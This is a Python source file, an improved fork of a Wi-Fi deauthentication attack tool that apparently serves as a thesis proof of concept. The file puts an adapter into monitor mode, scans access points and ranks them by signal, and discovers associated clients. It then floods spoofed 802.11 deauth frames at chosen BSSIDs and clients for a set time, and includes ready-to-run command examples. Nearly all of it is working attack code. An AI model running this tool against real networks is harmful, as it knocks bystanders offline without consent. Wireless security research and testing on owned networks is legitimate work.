#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Quick start (also shown by -h / --help):
#   scan:      python3 wifi-deauth2.py -i IFACE -s
#   by SSID:   python3 wifi-deauth2.py -i IFACE -t "MyAP" -L 20 -l 60
#   by BSSID:  python3 wifi-deauth2.py -i IFACE -b MAC -c CH -L 20 -l 60
#   multi-SSID:python3 wifi-deauth2.py -i IFACE -b "mac1,mac2" -c CH -l 45
#
# wifi-deauth2.py  —  IMPROVED VERSION (skripsi POC fork)
#
# Changelog vs original (flashnuke wifi-deauth):
#  1. -b/--bssid + -c/--channel : target by exact BSSID, auto-skip scan
#     (fixes silent wrong-BSSID attack on multi-BSSID SSIDs, e.g. M-1)
#  2. Ambiguous -t SSID (matched by several BSSIDs) now lists every match
#     and exits with code 2 instead of silently attacking the first one
#  3. Client detection rewritten with To-DS/From-DS-aware extraction
#     (old code recorded the AP's own MAC as a "client" on to-DS frames
#      and only listened for QoS/assoc frames => "Confirmed clients: 0")
#  4. Fixed spoofed client->AP deauth frame (addr2 was the AP, not client)
#  5. Pre-attack client discovery window (-L/--listen, default 5s)
#  6. AP scan keys entries per (SSID, BSSID) so listing shows every BSSID
import sys
import copy
import logging
import argparse
import traceback
import pkg_resources

logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)

from scapy.all import *
from time import sleep
from utils import *

conf.verb = 0

#   --------------------------------------------------------------------------------------------------------------------
#   .....................__      __ __  _____ __         _________                          __   __ ....................
#   ..................../  \    /  \__|/ ____\__|        \    __  \   ____  _____    __ ___/  |_|  |__..................
#   ....................\   \/\/   /  \   __\|  |  ______ |  |  \  \/ ___ \ \  __ \ |  |  \   __|  |  \................
#   .....................\        /|  ||  |  |  | /_____/ |  |__/  /\  ___/ | |__\ \|  |  /|  | |   Y  \...............
#   ......................\__/\__/ |__||__|  |__|         |_______/  \_____/_______/ ____/ |__| |___|__/................
#   ....................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ  (modified — see changelog above)
#   --------------------------------------------------------------------------------------------------------------------


class Interceptor:
    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
                 target, time, bssid=None, channel=None, listen=5.0):
        self.interface = net_iface
        self._channel_sniff_timeout = 1.5  # default 2
        self._scan_intv = 1.5
        self._deauth_intv = 2
        self._printf_res_intv = 10
        self._ssid_str_pad = 43  # total len 80

        self._abort = False
        self._current_channel_num = None
        self._current_channel_aps = set()

        self.attack_loop_count = 0

        self.target_ssid: Union[SSID, None] = None
        self._target_mac = None
        self.target = target
        self.time = time
        self._ssid_target = target
        self._loop_time = int(time)
        # IMPROVED multi-BSSID: -b accepts a comma-separated list (1 AP, many SSIDs)
        self._bssid_list = [m.strip().lower() for m in (bssid or "").split(",") if m.strip()]
        self._bssid_target = self._bssid_list[0] if self._bssid_list else None
        self._target_macs = [self._bssid_target] if self._bssid_target else None
        self._extra_ssids: List[SSID] = []
        # IMPROVED: strongest RSSI seen per scan key (SSID|BSSID) for ranking
        self._ap_rssi = {}  # scan key (SSID|BSSID) -> strongest RSSI dBm
        self._channel_override = int(channel) if channel else None
        self._listen_pref = float(listen)

        if not skip_monitor_mode_setup:
            print_info(f"Setting up monitor mode...")
            if not self._enable_monitor_mode():
                print_error(f"Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            print_info(f"Monitor mode was set up successfully")
        else:
            print_info(f"Skipping monitor mode setup...")

        if kill_networkmanager:
            print_info(f"Killing NetworkManager...")
            if not self._kill_networkmanager():
                print_error(f"Failed to kill NetworkManager...")

        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
        self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}

    def _enable_monitor_mode(self):
        for cmd in [f"sudo ip link set {self.interface} down",
                    f"sudo iw {self.interface} set monitor control",
                    f"sudo ip link set {self.interface} up"]:
            print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
            if os.system(cmd):
                return False
        return True

    @staticmethod
    def _kill_networkmanager():
        cmd = 'systemctl stop NetworkManager'
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        return not os.system(cmd)

    def _set_channel(self, ch_num):
        os.system(f"iw dev {self.interface} set channel {ch_num}")
        self._current_channel_num = ch_num

    def _get_channels(self) -> List[int]:
        channels = [int(channel.split('Channel')[1].split(':')[0].strip())
                    for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                    if 'Channel' in channel and 'Current' not in channel]
        # IMPROVED: iwlist often omits high UNII channels (157/161/165) even
        # though `iw set channel` tunes them fine — include them in the scan
        for extra in (157, 161, 165):
            if extra not in channels:
                channels.append(extra)
        return sorted(channels)

    @staticmethod
    def _extract_channel(pkt) -> Union[int, None]:
        """IMPROVED: reliable channel per BSSID from beacon/probe elements.

        The Radiotap 'Channel' field is driver-dependent and often wrong;
        DS Parameter Set (ID 3, 2.4GHz) and HT Operation (ID 61, both bands)
        carry the AP's actual primary channel.
        """
        try:
            elt = pkt.getlayer(Dot11Elt)
            while isinstance(elt, Dot11Elt):
                if elt.ID in (3, 61) and elt.info:
                    return elt.info[0]
                elt = elt.payload
        except Exception:
            pass
        try:
            ch = frequency_to_channel(pkt[RadioTap].Channel)
            if 1 <= ch <= 196:
                return ch
        except Exception:
            pass
        return None

    def _print_signal_ranking(self):
        """IMPROVED: rank APs by strongest RSSI + relative-distance estimate.
        Log-distance model: d = 10^((P0 - RSSI)/(10*n)), P0=-40 dBm @1m, n=2.7.
        Only a relative order is trustworthy (TX power differs per AP)."""
        rows = []
        for _, band_ssids in self._all_ssids.items():
            for key, ssid_obj in band_ssids.items():
                rssi = self._ap_rssi.get(key)
                if rssi is None:
                    continue
                dist = 10 ** ((-40.0 - rssi) / 27.0)
                rows.append((rssi, dist, ssid_obj))
        if not rows:
            return
        rows.sort(key=lambda r: -r[0])
        printf(f"\n{DELIM}")
        printf("Signal ranking (RSSI terkuat -> terlemah, estimasi jarak RELATIF)")
        printf("  * Skala: >=-50 dekat, -50..-65 sedang, -65..-78 jauh, <-78 sangat jauh")
        printf("  * Est. jarak pakai model log-distance (P0=-40dBm@1m, n=2.7) = perkiraan saja")
        pref = "  #  "
        printf(f"{pref}{'SSID':<26} {'MAC':<18} {'Ch':>3} {'RSSI':>6} {'Est':>7}  Kualitas")
        printf("  " + '-'*78)
        for i, (rssi, dist, s) in enumerate(rows, 1):
            if rssi >= -50:
                q, qc = "dekat ", GREEN
            elif rssi >= -65:
                q, qc = "sedang", YELLOW
            elif rssi >= -78:
                q, qc = "jauh  ", YELLOW
            else:
                q, qc = "sangat jauh", RED
            if dist < 1:
                ds = f"<1 m"
            elif dist < 100:
                ds = f"~{dist:.1f} m"
            else:
                ds = f"~{dist:.0f} m"
            name = s.name if len(s.name) <= 25 else s.name[:22] + "..."
            printf(f"  {str(i):>2}. {name:<26} {s.mac_addr:<18} {s.channel:>3} "
                   f"{rssi:>4} dBm {ds:>7}  {qc}{q}{RESET}")
        printf("  " + '-'*78)

    def _ap_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
                if ap_mac == BD_MACADDR or not ssid:
                    return
                pkt_ch = self._extract_channel(pkt)
                if pkt_ch is None:
                    try:
                        pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
                    except Exception:
                        pkt_ch = self._current_channel_num
                pkt_ch = pkt_ch if pkt_ch else (self._current_channel_num or 1)
                band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
                # IMPROVED: key per (SSID, BSSID) so multi-BSSID networks
                # list every radio separately instead of merging into one
                key = f"{ssid}|{ap_mac}"
                if key not in self._all_ssids[band_type]:
                    self._all_ssids[band_type][key] = SSID(ssid, ap_mac, band_type)
                # IMPROVED: keep strongest RSSI per BSSID (beacons flood ~10/s)
                try:
                    rssi = pkt[RadioTap].dBm_AntSignal
                    if rssi is not None:
                        rssi = int(rssi)
                        if key not in self._ap_rssi or rssi > self._ap_rssi[key]:
                            self._ap_rssi[key] = rssi
                except Exception:
                    pass
                # IMPROVED: keep the beacon's true channel even if the adapter's
                # iwlist range doesn't list it (attack uses `iw set channel` anyway)
                self._all_ssids[band_type][key].add_channel(pkt_ch)
            else:
                self._clients_sniff_cb(pkt)  # pass forward to find potential clients
        except Exception as exc:
            pass

    def _scan_channels_for_aps(self):
        try:
            for idx, ch_num in enumerate(self._channel_range):
                self._set_channel(ch_num)
                print_info(f"Scanning channel {self._current_channel_num} (left -> "
                           f"{len(self._channel_range) - (idx + 1)})", end="\r")
                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout, store=False)
        except KeyboardInterrupt:
            self.user_abort()
        finally:
            printf("")

    def _start_initial_ap_scan(self) -> SSID:
        # ---- FAST PATH: exact BSSID + explicit channel => no scan needed ----
        if self._bssid_target and self._channel_override and not getattr(self, "scan_only", False):
            ch = self._channel_override
            band = BandType.T_50GHZ if ch > 14 else BandType.T_24GHZ
            ssid = SSID(self._ssid_target if self._ssid_target else self._bssid_target,
                        self._bssid_target, band)
            ssid.add_channel(ch)
            # IMPROVED multi-BSSID: extra -b entries are sibling SSIDs on same radio
            for mac in self._bssid_list[1:]:
                sib = SSID(mac, mac, band)
                sib.add_channel(ch)
                self._extra_ssids.append(sib)
            if len(self._bssid_list) > 1:
                print_info(f"Fast path: {len(self._bssid_list)} BSSIDs on channel {ch} "
                           f"(scan skipped, multi-SSID AP)")
            else:
                print_info(f"Fast path: BSSID {self._bssid_target} on channel {ch} (scan skipped)")
            return ssid

        print_info(f"Starting AP scan, please wait... ({len(self._channel_range)} channels total)")

        self._scan_channels_for_aps()
        for _, band_ssids in self._all_ssids.items():
            for key, ssid_obj in band_ssids.items():
                # IMPROVED: beacon-derived channel may be outside the iwlist
                # range (e.g. 157/161) — allocate the bucket instead of KeyError
                self._channel_range.setdefault(ssid_obj.channel, defaultdict(dict))[key] = copy.deepcopy(ssid_obj)

        pref = '[   ] '
        printf(f"{DELIM}\n"
               f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")

        ctr = 0
        target_map: Dict[int, SSID] = dict()
        for channel, all_channel_aps in sorted(self._channel_range.items()):
            for key, ssid_obj in all_channel_aps.items():
                ctr += 1
                target_map[ctr] = copy.deepcopy(ssid_obj)
                pref = f"[{str(ctr).rjust(3, ' ')}] "
                preflen = len(pref)
                pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
        if not target_map:
            print_error("Not APs were found, quitting...")
            self._abort = True
            exit(0)

        printf(DELIM)

        # ---- IMPROVED -s/--scan: list APs only, never attack ----
        if getattr(self, "scan_only", False):
            self._print_signal_ranking()
            print_info(f"Scan-only mode: {len(target_map)} AP(s) listed, no attack launched.")
            print_info("Restoring interface to managed mode...")
            restore_print()
            os.system(f"ip link set {self.interface} down")
            os.system(f"iw {self.interface} set type managed")
            os.system(f"ip link set {self.interface} up")
            print(f"[+] {self.interface} back to managed mode.")
            exit(0)

        # ---- IMPROVED target selection: exact BSSID filter + ambiguity guard ----
        matches: List[Tuple[int, SSID]] = []
        for index, ssid_obj in target_map.items():
            if self._bssid_target:
                # IMPROVED multi-BSSID: -b may hold several BSSIDs of one AP
                if ssid_obj.mac_addr.lower() in self._bssid_list and \
                        (not self._ssid_target or ssid_obj.name == self._ssid_target):
                    matches.append((index, ssid_obj))
            elif self._ssid_target and ssid_obj.name == self._ssid_target:
                matches.append((index, ssid_obj))

        if not matches:
            what = (f"BSSID {self._bssid_target}" if self._bssid_target else f"'{self._ssid_target}'")
            print_error(f"{what} not found in the list of APs.")
            exit(1)

        # IMPROVED multi-BSSID: multiple matches are EXPECTED when -b is a list
        if len(self._bssid_list) > 1:
            by_mac = {ssid_obj.mac_addr.lower(): ssid_obj for _, ssid_obj in matches}
            missing = [m for m in self._bssid_list if m not in by_mac]
            if missing:
                print_error(f"BSSID(s) not found in scan: {', '.join(missing)}")
                exit(1)
            chans = sorted({ssid_obj.channel for _, ssid_obj in matches})
            if len(chans) > 1:
                print_error(f"Multi-BSSID targets span channels {chans} — a single-radio "
                            f"multi-SSID AP shares one channel; split the attack per channel.")
                exit(1)
            self._extra_ssids = [by_mac[m] for m in self._bssid_list[1:]]
            print_info(f"Multi-SSID AP: {len(matches)} BSSIDs matched on channel {chans[0]}")
            return by_mac[self._bssid_list[0]]

        if len(matches) > 1:
            print_error(f"'{self._ssid_target}' matches {len(matches)} BSSIDs — ambiguous target. "
                        f"Attack aborted (old tool silently picked the first one).")
            pref = '[   ] '
            printf(f"{DELIM}\n"
                   f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")
            for index, ssid_obj in matches:
                pref = f"[{str(index).rjust(3, ' ')}] "
                preflen = len(pref)
                pref = f"[{BOLD}{YELLOW}{str(index).rjust(3, ' ')}{RESET}] "
                printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
            printf(DELIM)
            print_error(f"Re-run with: -b <MAC Address> [-c <channel>] to pick the exact radio.")
            exit(2)

        return matches[0][1]

    def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
        return f"{ssid.ljust(self._ssid_str_pad - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(self._ssid_str_pad // 2, ' ')}{mcaddr}"

    def _client_from_pkt(self, pkt) -> Union[str, None]:
        """IMPROVED: extract the client MAC from a frame, To-DS/From-DS aware.

        Returns the client MAC only when the frame proves association with the
        target BSSID (assoc/reassoc response, or data traffic whose AP side
        matches the target). Never returns the AP itself or broadcast.
        """
        if not self._target_mac or not pkt.haslayer(Dot11):
            return None
        a1, a2 = getattr(pkt, "addr1", None), getattr(pkt, "addr2", None)
        if not a1 or not a2:
            return None
        a1, a2 = str(a1), str(a2)
        bcast = (BD_MACADDR, "00:00:00:00:00:00")
        aps = set(getattr(self, "_target_macs", None) or [self._target_mac])

        def _is_multicast(mac):
            try:
                return int(mac.split(":")[0], 16) & 1
            except Exception:
                return True

        # association responses prove membership regardless of DS bits
        if pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0:
            return a1 if a2 in aps and a1 not in bcast else None
        if pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0:
            return a1 if a2 in aps and a1 not in bcast else None

        # data / QoS data frames: identify direction properly
        if pkt[Dot11].type == 2:
            fc = int(pkt[Dot11].FCfield)
            to_ds, from_ds = bool(fc & 0x1), bool(fc & 0x2)
            if to_ds and not from_ds and a1 in aps:
                # STA -> AP : addr1=BSSID, addr2=client
                return None if (a2 in bcast or _is_multicast(a2)) else a2
            if from_ds and not to_ds and a2 in aps:
                # AP -> STA : addr2=BSSID, addr1=client (unicast only)
                return None if (a1 in bcast or _is_multicast(a1)) else a1
        return None

    def _clients_sniff_cb(self, pkt):
        try:
            c_mac = self._client_from_pkt(pkt)
            _aps = set(getattr(self, "_target_macs", None) or [self._target_mac])
            if c_mac and c_mac not in _aps and c_mac not in self.target_ssid.clients:
                self.target_ssid.clients.append(c_mac)
                try:
                    with open("/root/wifi-deauth-improved/clients_seen.log", "a") as f:
                        f.write(f"{int(get_time())} {self.target_ssid.name} "
                                f"{self.target_ssid.mac_addr} {c_mac}\n")
                except Exception:
                    pass
        except Exception:
            pass

    @staticmethod
    def _packet_confirms_client(pkt):
        # kept for backward compatibility; detection now lives in _client_from_pkt
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
               pkt.haslayer(Dot11QoS)

    def _listen_for_clients(self):
        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True, store=False)

    def _run_deauther(self):
        try:
            print_info(f"Starting de-auth loop...")
            # IMPROVED multi-BSSID: deauth EVERY BSSID of this radio (1 AP, many SSIDs)
            macs = getattr(self, "_target_macs", None) or [self.target_ssid.mac_addr]

            rd_frm = RadioTap()
            deauth_frm = Dot11Deauth(reason=7)
            while not self._abort:
                self.attack_loop_count += 1
                for ap_mac in macs:
                    # AP -> broadcast (all clients of THIS BSSID)
                    sendp(rd_frm /
                          Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                          deauth_frm,
                          iface=self.interface)
                    for client_mac in self.target_ssid.clients:
                        # IMPROVED: correct frame addresses both directions
                        # AP -> client
                        sendp(rd_frm /
                              Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                              deauth_frm,
                              iface=self.interface)
                        # client -> AP (spoofed sender MUST be the client)
                        sendp(rd_frm /
                              Dot11(addr1=ap_mac, addr2=client_mac, addr3=ap_mac) /
                              deauth_frm,
                              iface=self.interface)
                sleep(self._deauth_intv)
        except Exception as exc:
            print_error(f"Exception in deauth-loop -> {traceback.format_exc()}")
            self._abort = True
            exit(0)

    def run(self):
        self.target_ssid = self._start_initial_ap_scan()
        self._target_mac = self.target_ssid.mac_addr
        ssid_ch = self.target_ssid.channel
        # IMPROVED multi-BSSID: full MAC set = primary + sibling SSIDs of same radio
        self._target_macs = [self._target_mac] + [s.mac_addr for s in self._extra_ssids]
        print_info(f"Attacking target {self.target_ssid.name} ({self.target_ssid.mac_addr})")
        if len(self._target_macs) > 1:
            print_info(f"Multi-SSID AP: attacking {len(self._target_macs)} BSSIDs on one radio:")
            for s in [self.target_ssid] + self._extra_ssids:
                print_info(f"    - {s.name} ({s.mac_addr})")
        print_info(f"Setting channel -> {ssid_ch}")
        self._set_channel(ssid_ch)

        # IMPROVED: listener starts FIRST with a discovery window, so clients
        # are known before the first deauth frame goes out
        listener = Thread(target=self._listen_for_clients, args=tuple(), daemon=True)
        listener.start()
        if self._listen_pref > 0:
            print_info(f"Client discovery window: {self._listen_pref}s on channel {ssid_ch}...")
            sleep(self._listen_pref)
            if self.target_ssid.clients:
                print_info(f"Discovered {len(self.target_ssid.clients)} client(s): "
                           f"{', '.join(self.target_ssid.clients)}")
            else:
                print_info("No clients observed yet (AP may be idle / clients in power-save)")

        deauther = Thread(target=self._run_deauther, args=tuple(), daemon=True)
        deauther.start()

        printf(f"{DELIM}\n")
        try:
            start = get_time()
            while not self._abort:
                print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
                print_info(f"Channel{str(ssid_ch).rjust(80 - 11, ' ')}")
                print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
                print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
                print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid.clients)).rjust(80 - 21, ' ')}{RESET}")
                print_info(f"Elapsed sec {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
                sleep(self._printf_res_intv)
                clear_line(7)
                if time.time() - start >= self._loop_time + 3:
                    break
        except KeyboardInterrupt:
            print("")
            self.user_abort()

    def user_abort(self):
        self._abort = True
        printf(f"{DELIM}")
        print_error(f"User asked to stop, quitting...")
        exit(0)


if __name__ == "__main__":
    printf(f"\n{BANNER}\n"
           f"Make sure of the following:\n"
           f"1. You are running as {BOLD}root{RESET}\n"
           f"2. You kill NetworkManager (manually or by passing {BOLD}--kill{RESET})\n"
           f"3. Your wireless adapter supports {BOLD}monitor mode{RESET} (refer to docs)\n\n"
           f"Written by {BOLD}@flashnuke{RESET} {BOLD}(improved fork){RESET}")
    printf(DELIM)
    restore_print()

    if "linux" not in platform:
        raise Exception(f"Unsupported operating system {platform}, only linux is supported...")
    with open("requirements.txt", "r") as reqs:
        pkg_resources.require(reqs.readlines())

    EXAMPLES = """
examples (run from /root/wifi-deauth-improved, always python3 + sudo):

  # 1. SCAN first (list APs, no attack, auto-restore managed)
  sudo bash -c 'cd /root/wifi-deauth-improved && \\
    python3 wifi-deauth2.py -i wlx28ee52133183 -s'

  # 2. DEAUTH one AP by SSID (60 seconds)
  sudo bash -c 'cd /root/wifi-deauth-improved && \\
    python3 wifi-deauth2.py -i wlx28ee52133183 -t "MyAP" -L 20 -l 60'

  # 3. DEAUTH exact BSSID (most accurate, 60 seconds)
  sudo bash -c 'cd /root/wifi-deauth-improved && \\
    python3 wifi-deauth2.py -i wlx28ee52133183 \\
    -b AA:BB:CC:11:22:33 -c 2 -L 20 -l 60'

  # 4. one AP with MULTIPLE SSIDs (several BSSIDs, same radio)
  sudo bash -c 'cd /root/wifi-deauth-improved && \\
    python3 wifi-deauth2.py -i wlx28ee52133183 \\
    -b "11:22:33:44:55:66,11:22:33:44:55:67" -c 6 -L 30 -l 45'

  # long run: -l 2700 = 45 minutes
  # after an attack, restore the interface:
  sudo bash -c 'ip link set wlx28ee52133183 down; \\
    iw dev wlx28ee52133183 set type managed; \\
    ip link set wlx28ee52133183 up'
"""
    parser = argparse.ArgumentParser(
        description='A simple program to perform a deauth attack '
                    '(improved: exact-BSSID targeting, ambiguity guard, '
                    'multi-BSSID, scan-only mode, fixed client detection)',
        epilog=EXAMPLES,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
                        action='store', dest="net_iface", metavar="network_interface", required=True)
    parser.add_argument('-sm', '--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                        default=False, dest="skip_monitormode", required=False)
    parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                        action='store_true', default=False, dest="kill_networkmanager", required=False)
    parser.add_argument('-t', '--target', help='target AP by SSID name (must be unambiguous unless -b given)',
                        action='store', default=False, dest="target", required=False)
    parser.add_argument('-b', '--bssid', help='target by exact BSSID/MAC; comma-separated list = 1 AP with multiple SSIDs',
                        action='store', default=None, dest="bssid", required=False)
    parser.add_argument('-c', '--channel', help='channel of the target BSSID (with -b this skips the AP scan)',
                        action='store', default=None, dest="channel", required=False)
    parser.add_argument('-L', '--listen', help='client discovery window in seconds before attacking (default 5)',
                        action='store', default="5", dest="listen", required=False)
    parser.add_argument('-l', '--loop', help='how long it will attack, seconds (default 30)',
                        action='store', default="30", dest="time", required=False)
    parser.add_argument('-s', '--scan', help='scan-only: list every AP (SSID/Channel/BSSID) then exit, no attack',
                        action='store_true', default=False, dest="scan_only", required=False)
    pargs = parser.parse_args()

    invalidate_print()  # after arg parsing

    if not pargs.target and not pargs.bssid and not pargs.scan_only:
        restore_print()
        print("error: one of -t/--target or -b/--bssid is required")
        exit(1)

    attacker = Interceptor(net_iface=pargs.net_iface,
                           skip_monitor_mode_setup=pargs.skip_monitormode,
                           time=pargs.time,
                           target=pargs.target,
                           kill_networkmanager=pargs.kill_networkmanager,
                           bssid=pargs.bssid,
                           channel=pargs.channel,
                           listen=pargs.listen)
    attacker.scan_only = pargs.scan_only
    attacker.run()
